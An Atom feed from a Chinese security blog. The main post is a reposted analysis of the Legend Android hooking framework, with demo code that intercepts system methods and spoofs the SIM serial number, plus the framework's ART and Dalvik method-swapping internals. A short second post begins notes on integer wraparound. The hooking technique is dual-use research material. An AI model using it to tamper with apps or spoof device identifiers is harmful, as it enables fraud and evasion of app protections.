<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FloatingGuy&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-02-12T12:48:42.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>FloatingGuy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android免Root环境下Hook框架Legend应用</title>
    <link href="http://yoursite.com/2017/02/12/Android%E5%85%8DRoot%E7%8E%AF%E5%A2%83%E4%B8%8BHook%E6%A1%86%E6%9E%B6Legend%E5%BA%94%E7%94%A8/"/>
    <id>http://yoursite.com/2017/02/12/Android免Root环境下Hook框架Legend应用/</id>
    <published>2017-02-12T10:32:59.000Z</published>
    <updated>2017-02-12T12:48:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>转载：<a href="https://feicong.github.io/2017/02/12/legend/" target="_blank" rel="external">Android免Root环境下Hook框架Legend原理分析</a></p>
<h4 id="hook-代码"><a href="#hook-代码" class="headerlink" title="hook 代码"></a>hook 代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Hook</span>(<span class="string">"android.app.Activity::startActivity@android.content.Intent"</span>)</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Activity_startActivity</span><span class="params">(Activity thiz, Intent intent)</span> </span>&#123;</div><div class="line">  <span class="keyword">if</span> (!ALLOW_LAUNCH_ACTIVITY) &#123;</div><div class="line">    Toast.makeText(thiz, <span class="string">"I am sorry to turn your Activity down :)"</span>, Toast.LENGTH_SHORT).show();</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    HookManager.getDefault().callSuper(thiz, intent);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用 Hook 注解，指明要 hook 的 method。<br><code>@Hook(&quot;android.app.Activity::startActivity@android.content.Intent&quot;)</code><br>格式:@Hook(“类名::方法名@参数1#参数2#…”)</p>
<p>激活所有注解Hook</p>
<ul>
<li><p><code>HookManager.getDefault().applyHooks(YourClass.class);</code></p>
</li>
<li><p><code>HookManager.getDefault().hookMethod(originMethod, hookMethod);</code></p>
</li>
</ul>
<p>完整案例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.legend.demo;</div><div class="line"></div><div class="line"><span class="keyword">import</span> android.app.Activity;</div><div class="line"><span class="keyword">import</span> android.app.Application;</div><div class="line"><span class="keyword">import</span> android.content.Context;</div><div class="line"><span class="keyword">import</span> android.content.Intent;</div><div class="line"><span class="keyword">import</span> android.telephony.TelephonyManager;</div><div class="line"><span class="keyword">import</span> android.widget.Toast;</div><div class="line"></div><div class="line"><span class="keyword">import</span> com.lody.legend.Hook;</div><div class="line"><span class="keyword">import</span> com.lody.legend.HookManager;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * <span class="doctag">@author</span> Lody</div><div class="line"> * <span class="doctag">@version</span> 1.0</div><div class="line"> */</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> ENABLE_TOAST = <span class="keyword">true</span>;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> ALLOW_LAUNCH_ACTIVITY = <span class="keyword">true</span>;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">attachBaseContext</span><span class="params">(Context base)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.attachBaseContext(base);</div><div class="line">        HookManager.getDefault().applyHooks(App.class);</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Hook</span>(<span class="string">"android.app.Application::onCreate"</span>)</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Application_onCreate</span><span class="params">(Application app)</span> </span>&#123;</div><div class="line">        Toast.makeText(app, <span class="string">"Application =&gt; onCreate()"</span>, Toast.LENGTH_SHORT).show();</div><div class="line">        HookManager.getDefault().callSuper(app);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Hook</span>(<span class="string">"android.telephony.TelephonyManager::getSimSerialNumber"</span>)</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">TelephonyManager_getSimSerialNumber</span><span class="params">(TelephonyManager thiz)</span> </span>&#123;</div><div class="line">         <span class="keyword">return</span> <span class="string">"110"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Hook</span>(<span class="string">"android.widget.Toast::show"</span>)</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Toast_show</span><span class="params">(Toast toast)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (ENABLE_TOAST) &#123;</div><div class="line">            HookManager.getDefault().callSuper(toast);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Hook</span>(<span class="string">"android.app.Activity::startActivity@android.content.Intent"</span>)</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Activity_startActivity</span><span class="params">(Activity activity, Intent intent)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (!ALLOW_LAUNCH_ACTIVITY) &#123;</div><div class="line">            Toast.makeText(activity, <span class="string">"I am sorry to turn your Activity down :)"</span>, Toast.LENGTH_SHORT).show();</div><div class="line">        &#125;<span class="keyword">else</span> &#123;</div><div class="line">            HookManager.getDefault().callSuper(activity, intent);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="appleHooks-激活注解类"><a href="#appleHooks-激活注解类" class="headerlink" title="appleHooks 激活注解类"></a>appleHooks 激活注解类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Legend/legendCore/src/main/java/com/lody/legend/HookManager.java</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">applyHooks</span><span class="params">(Class&lt;?&gt; holdClass)</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span> (Method hookMethod : holdClass.getDeclaredMethods()) &#123;</div><div class="line">        Hook hook = hookMethod.getAnnotation(Hook.class);</div><div class="line">        <span class="keyword">if</span> (hook != <span class="keyword">null</span>) &#123;</div><div class="line">            String statement = hook.value();</div><div class="line">            String[] splitValues = statement.split(<span class="string">"::"</span>);</div><div class="line">            <span class="keyword">if</span> (splitValues.length == <span class="number">2</span>) &#123;</div><div class="line">                String className = splitValues[<span class="number">0</span>];</div><div class="line">                String[] methodNameWithSignature = splitValues[<span class="number">1</span>].split(<span class="string">"@"</span>);</div><div class="line">                <span class="keyword">if</span> (methodNameWithSignature.length &lt;= <span class="number">2</span>) &#123;</div><div class="line">                    String methodName = methodNameWithSignature[<span class="number">0</span>];</div><div class="line">                    String signature = methodNameWithSignature.length == <span class="number">2</span> ? methodNameWithSignature[<span class="number">1</span>] : <span class="string">""</span>;</div><div class="line">                    String[] paramList = signature.split(<span class="string">"#"</span>);</div><div class="line">                    <span class="keyword">if</span> (paramList[<span class="number">0</span>].equals(<span class="string">""</span>)) &#123;</div><div class="line">                        paramList = <span class="keyword">new</span> String[<span class="number">0</span>];</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">try</span> &#123;</div><div class="line">                        Class&lt;?&gt; clazz = Class.forName(className);</div><div class="line">                        <span class="keyword">boolean</span> isResolve = <span class="keyword">false</span>;</div><div class="line">                        <span class="keyword">for</span> (Method method : clazz.getDeclaredMethods()) &#123;</div><div class="line">                            <span class="keyword">if</span> (method.getName().equals(methodName)) &#123;</div><div class="line">                                Class&lt;?&gt;[] types = method.getParameterTypes();</div><div class="line">                                <span class="keyword">if</span> (paramList.length == types.length) &#123;</div><div class="line">                                    <span class="keyword">boolean</span> isMatch = <span class="keyword">true</span>;</div><div class="line">                                    <span class="keyword">for</span> (<span class="keyword">int</span> N = <span class="number">0</span>; N &lt; types.length; N++) &#123;</div><div class="line">                                        <span class="keyword">if</span> (!types[N].getName().equals(paramList[N])) &#123;</div><div class="line">                                            isMatch = <span class="keyword">false</span>;</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        &#125;</div><div class="line">                                    &#125;</div><div class="line">                                    <span class="keyword">if</span> (isMatch) &#123;</div><div class="line">                                        hookMethod(method, hookMethod);</div><div class="line">                                        isResolve = <span class="keyword">true</span>;</div><div class="line">                                        Logger.d(<span class="string">"[+++] %s have hooked."</span>, method.getName());</div><div class="line">                                    &#125;</div><div class="line">                                &#125;</div><div class="line">                            &#125;</div><div class="line">                            <span class="keyword">if</span> (isResolve) &#123;</div><div class="line">                                <span class="keyword">break</span>;</div><div class="line">                            &#125;</div><div class="line">                        &#125;</div><div class="line">                        <span class="keyword">if</span> (!isResolve) &#123;</div><div class="line">                            Logger.e(<span class="string">"[---] Cannot resolve Method : %s."</span>, Arrays.toString(methodNameWithSignature));</div><div class="line">                        &#125;</div><div class="line">                    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</div><div class="line">                        Logger.e(<span class="string">"[---] Error to Load Hook Method From : %s."</span> , hookMethod.getName());</div><div class="line">                        e.printStackTrace();</div><div class="line">                    &#125;</div><div class="line">                &#125;<span class="keyword">else</span> &#123;</div><div class="line">                    Logger.e(<span class="string">"[---] Can't split method and signature : %s."</span>, Arrays.toString(methodNameWithSignature));</div><div class="line">                &#125;</div><div class="line">            &#125;<span class="keyword">else</span> &#123;</div><div class="line">                Logger.e(<span class="string">"[---] Can't understand your statement : [%s]."</span>, statement);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="hookMethod-激活注解类"><a href="#hookMethod-激活注解类" class="headerlink" title="hookMethod 激活注解类"></a>hookMethod 激活注解类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hookMethod</span><span class="params">(Method origin, Method hook)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (isArt()) &#123;</div><div class="line">        hookMethodArt(origin, hook);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        hookMethodDalvik(origin, hook);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isArt</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> getVmVersion().startsWith(<span class="string">"2"</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getVmVersion</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> System.getProperty(<span class="string">"java.vm.version"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>hook art<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Method <span class="title">hookMethodArt</span><span class="params">(Method origin, Method hook)</span> </span>&#123;</div><div class="line">        ArtMethod artOrigin = ArtMethod.of(origin);</div><div class="line">        ArtMethod artHook = ArtMethod.of(hook);         <span class="comment">//</span></div><div class="line">        Method backup = artOrigin.backup().getMethod();</div><div class="line">        backup.setAccessible(<span class="keyword">true</span>);</div><div class="line">        <span class="keyword">long</span> originPointFromQuickCompiledCode = artOrigin.getEntryPointFromQuickCompiledCode();</div><div class="line">        <span class="keyword">long</span> originEntryPointFromJni = artOrigin.getEntryPointFromJni();</div><div class="line">        <span class="keyword">long</span> originEntryPointFromInterpreter = artOrigin.getEntryPointFromInterpreter();</div><div class="line">        <span class="keyword">long</span> originDeclaringClass = artOrigin.getDeclaringClass();</div><div class="line">        <span class="keyword">long</span> originAccessFlags = artOrigin.getAccessFlags();</div><div class="line">        <span class="keyword">long</span> originDexCacheResolvedMethods = artOrigin.getDexCacheResolvedMethods();</div><div class="line">        <span class="keyword">long</span> originDexCacheResolvedTypes = artOrigin.getDexCacheResolvedTypes();</div><div class="line">        <span class="keyword">long</span> originDexCodeItemOffset = artOrigin.getDexCodeItemOffset();</div><div class="line">        <span class="keyword">long</span> originDexMethodIndex = artOrigin.getDexMethodIndex();</div><div class="line">        <span class="keyword">long</span> hookPointFromQuickCompiledCode = artHook.getEntryPointFromQuickCompiledCode();</div><div class="line">        <span class="keyword">long</span> hookEntryPointFromJni = artHook.getEntryPointFromJni();</div><div class="line">        <span class="keyword">long</span> hookEntryPointFromInterpreter = artHook.getEntryPointFromInterpreter();</div><div class="line">        <span class="keyword">long</span> hookDeclaringClass = artHook.getDeclaringClass();</div><div class="line">        <span class="keyword">long</span> hookAccessFlags = artHook.getAccessFlags();</div><div class="line">        <span class="keyword">long</span> hookDexCacheResolvedMethods = artHook.getDexCacheResolvedMethods();</div><div class="line">        <span class="keyword">long</span> hookDexCacheResolvedTypes = artHook.getDexCacheResolvedTypes();</div><div class="line">        <span class="keyword">long</span> hookDexCodeItemOffset = artHook.getDexCodeItemOffset();</div><div class="line">        <span class="keyword">long</span> hookDexMethodIndex = artHook.getDexMethodIndex();</div><div class="line">        ByteBuffer hookInfo = ByteBuffer.allocate(ART_HOOK_INFO_SIZE);</div><div class="line">        hookInfo.putLong(originPointFromQuickCompiledCode);</div><div class="line">        hookInfo.putLong(originEntryPointFromJni);</div><div class="line">        hookInfo.putLong(originEntryPointFromInterpreter);</div><div class="line">        hookInfo.putLong(originDeclaringClass);</div><div class="line">        hookInfo.putLong(originAccessFlags);</div><div class="line">        hookInfo.putLong(originDexCacheResolvedMethods);</div><div class="line">        hookInfo.putLong(originDexCacheResolvedTypes);</div><div class="line">        hookInfo.putLong(originDexCodeItemOffset);</div><div class="line">        hookInfo.putLong(originDexMethodIndex);</div><div class="line">        hookInfo.putLong(hookPointFromQuickCompiledCode);</div><div class="line">        hookInfo.putLong(hookEntryPointFromJni);</div><div class="line">        hookInfo.putLong(hookEntryPointFromInterpreter);</div><div class="line">        hookInfo.putLong(hookDeclaringClass);</div><div class="line">        hookInfo.putLong(hookAccessFlags);</div><div class="line">        hookInfo.putLong(hookDexCacheResolvedMethods);</div><div class="line">        hookInfo.putLong(hookDexCacheResolvedTypes);</div><div class="line">        hookInfo.putLong(hookDexCodeItemOffset);</div><div class="line">        hookInfo.putLong(hookDexMethodIndex);</div><div class="line">        artOrigin.setEntryPointFromQuickCompiledCode(hookPointFromQuickCompiledCode);</div><div class="line">        artOrigin.setEntryPointFromInterpreter(hookEntryPointFromInterpreter);</div><div class="line">        artOrigin.setDeclaringClass(hookDeclaringClass);</div><div class="line">        artOrigin.setDexCacheResolvedMethods(hookDexCacheResolvedMethods);</div><div class="line">        artOrigin.setDexCacheResolvedTypes(hookDexCacheResolvedTypes);</div><div class="line">        artOrigin.setDexCodeItemOffset((<span class="keyword">int</span>) hookDexCodeItemOffset);</div><div class="line">        artOrigin.setDexMethodIndex((<span class="keyword">int</span>) hookDexMethodIndex);</div><div class="line">        <span class="keyword">int</span> accessFlags = origin.getModifiers();</div><div class="line">        <span class="keyword">if</span> (Modifier.isNative(accessFlags)) &#123;</div><div class="line">            accessFlags &amp;= ~ Modifier.NATIVE;</div><div class="line">            artOrigin.setAccessFlags(accessFlags);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">long</span> memoryAddress = Memory.alloc(ART_HOOK_INFO_SIZE);</div><div class="line">        Memory.write(memoryAddress,hookInfo.array());</div><div class="line">        artOrigin.setEntryPointFromJni(memoryAddress);</div><div class="line">        <span class="keyword">return</span> backup;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>接下来的代码是获取artOrigin与artHook的重要字段，然后构造ByteBuffer类型的hookInfo，最后调用以下三行代码来完成Hook：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">long</span> memoryAddress = Memory.alloc(ART_HOOK_INFO_SIZE);</div><div class="line">Memory.write(memoryAddress,hookInfo.array());</div><div class="line">artOrigin.setEntryPointFromJni(memoryAddress);</div></pre></td></tr></table></figure></p>
<p>在调用ArtMethod::of()方法构造ArtMethod时，会根据不同的系统版本来构造不同的对象。</p>
<p>Memory.write()方法底层调用的LegendNative.memput()，它是一个native方法，对应的实现是android_memput()，代码如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Legend/Native/jni/legend_native.cpp</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">android_memput</span><span class="params">(JNIEnv * env, jclass clazz, jlong dest, jbyteArray src)</span> </span>&#123;</div><div class="line">    jbyte *srcPnt = env-&gt;GetByteArrayElements(src, <span class="number">0</span>);</div><div class="line">    jsize length = env-&gt;GetArrayLength(src);</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> * destPnt = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)dest;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</div><div class="line">        destPnt[i] = srcPnt[i];</div><div class="line">    &#125;</div><div class="line">    env-&gt;ReleaseByteArrayElements(src, srcPnt, <span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Legend/legendCore/src/main/java/com/lody/legend/HookManager.java</span></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Method <span class="title">hookMethodDalvik</span><span class="params">(Method origin, Method hook)</span> </span>&#123;</div><div class="line">    DalvikMethodStruct dvmOriginMethod = DalvikMethodStruct.of(origin);</div><div class="line">    DalvikMethodStruct dvmHookMethod = DalvikMethodStruct.of(hook);   <span class="comment">//</span></div><div class="line">    <span class="keyword">byte</span>[] originClassData = dvmOriginMethod.clazz.read();</div><div class="line">    <span class="keyword">byte</span>[] originInsnsData = dvmOriginMethod.insns.read();</div><div class="line">    <span class="keyword">byte</span>[] originInsSizeData = dvmOriginMethod.insSize.read();</div><div class="line">    <span class="keyword">byte</span>[] originRegisterSizeData = dvmOriginMethod.registersSize.read();</div><div class="line">    <span class="keyword">byte</span>[] originAccessFlags = dvmOriginMethod.accessFlags.read();</div><div class="line">    <span class="keyword">byte</span>[] originNativeFunc = dvmOriginMethod.nativeFunc.read();</div><div class="line">    <span class="keyword">byte</span>[] hookClassData = dvmHookMethod.clazz.read();</div><div class="line">    <span class="keyword">byte</span>[] hookInsnsData = dvmHookMethod.insns.read();</div><div class="line">    <span class="keyword">byte</span>[] hookInsSizeData = dvmHookMethod.insSize.read();</div><div class="line">    <span class="keyword">byte</span>[] hookRegisterSizeData = dvmHookMethod.registersSize.read();</div><div class="line">    <span class="keyword">byte</span>[] hookAccessFlags = dvmHookMethod.accessFlags.read();</div><div class="line">    <span class="keyword">byte</span>[] hookNativeFunc = dvmHookMethod.nativeFunc.read();</div><div class="line">    dvmOriginMethod.clazz.write(hookClassData);</div><div class="line">    dvmOriginMethod.insns.write(hookInsnsData);</div><div class="line">    dvmOriginMethod.insSize.write(hookInsSizeData);</div><div class="line">    dvmOriginMethod.registersSize.write(hookRegisterSizeData);</div><div class="line">    dvmOriginMethod.accessFlags.write(hookAccessFlags);</div><div class="line">    ByteBuffer byteBuffer = ByteBuffer.allocate(DVM_HOOK_INFO_SIZE);</div><div class="line">    byteBuffer.put(originClassData);</div><div class="line">    byteBuffer.put(originInsnsData);</div><div class="line">    byteBuffer.put(originInsSizeData);</div><div class="line">    byteBuffer.put(originRegisterSizeData);</div><div class="line">    byteBuffer.put(originAccessFlags);</div><div class="line">    byteBuffer.put(originNativeFunc);</div><div class="line">    <span class="comment">//May leak</span></div><div class="line">    <span class="keyword">long</span> memoryAddress = Memory.alloc(DVM_HOOK_INFO_SIZE);</div><div class="line">    Memory.write(memoryAddress, byteBuffer.array());</div><div class="line">    dvmOriginMethod.nativeFunc.write(memoryAddress);</div><div class="line">    <span class="keyword">return</span> origin;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>dvmOriginMethod与dvmHookMethod分别代表原方法与Hook替换的方法，同样的，使用底层内存的写操作，对所有需要替换的字段进行替换。</p>
<h4 id="调用原方法"><a href="#调用原方法" class="headerlink" title="调用原方法"></a>调用原方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Legend/legendCore/src/main/java/com/lody/legend/HookManager.java</span></div><div class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">callSuper</span><span class="params">(Object who, Object... args)</span> </span>&#123;</div><div class="line">    StackTraceElement[] traceElements = Thread.currentThread().getStackTrace();</div><div class="line">    StackTraceElement currentInvoking = traceElements[<span class="number">3</span>];</div><div class="line">    String invokingClassName = currentInvoking.getClassName();</div><div class="line">    String invokingMethodName = currentInvoking.getMethodName();</div><div class="line">    Map&lt;String,List&lt;Method&gt;&gt; methodNameToBackupMethodsMap = classToBackupMethodsMapping.get(invokingClassName);</div><div class="line">    <span class="keyword">if</span> (methodNameToBackupMethodsMap != <span class="keyword">null</span>) &#123;</div><div class="line">        List&lt;Method&gt; methodList = methodNameToBackupMethodsMap.get(invokingMethodName);</div><div class="line">        <span class="keyword">if</span> (methodList != <span class="keyword">null</span>) &#123;</div><div class="line">            Method method = matchSimilarMethod(methodList, args);</div><div class="line">            <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</div><div class="line">                <span class="keyword">try</span> &#123;</div><div class="line">                   <span class="keyword">if</span> (Runtime.isArt()) &#123;</div><div class="line">                       <span class="keyword">return</span> callSuperArt(method, who, args);</div><div class="line">                   &#125;<span class="keyword">else</span> &#123;</div><div class="line">                       <span class="keyword">return</span> callSuperDalvik(method, who, args);</div><div class="line">                   &#125;</div><div class="line">                &#125; <span class="keyword">catch</span> (Throwable e) &#123;</div><div class="line">                    Logger.e(<span class="string">"[---] Call super method with error : %s, detail message please see the [Logcat :system.err]."</span>, e.getMessage());</div><div class="line">                    e.printStackTrace();</div><div class="line">                &#125;</div><div class="line">            &#125;<span class="keyword">else</span> &#123;</div><div class="line">                Logger.e(<span class="string">"[---] Super method cannot found in backup map."</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转载：&lt;a href=&quot;https://feicong.github.io/2017/02/12/legend/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Android免Root环境下Hook框架Legend原理分析&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
      <category term="hook" scheme="http://yoursite.com/tags/hook/"/>
    
      <category term="opensource-git" scheme="http://yoursite.com/tags/opensource-git/"/>
    
      <category term="了解" scheme="http://yoursite.com/tags/%E4%BA%86%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>5.整数安全</title>
    <link href="http://yoursite.com/2017/02/12/5-%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/"/>
    <id>http://yoursite.com/2017/02/12/5-整数安全/</id>
    <published>2017-02-12T09:59:39.000Z</published>
    <updated>2017-02-12T13:27:40.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="《C-安全编程》–-第五章：整数安全"><a href="#《C-安全编程》–-第五章：整数安全" class="headerlink" title="《C++安全编程》– 第五章：整数安全"></a>《C++安全编程》– 第五章：整数安全</h3><ul>
<li>特定于平台和编译器的整数极值记录在<limits.h>头文件中。<br>无符号操作数的计算永远不会溢出,但是整数存在 <em>回绕</em> 的安全隐患。<br><a href="/img/CppSC/5-1.png">如下图就是回绕的原理</a></limits.h></li>
</ul>
]]></content>
    
    <summary type="html">
    
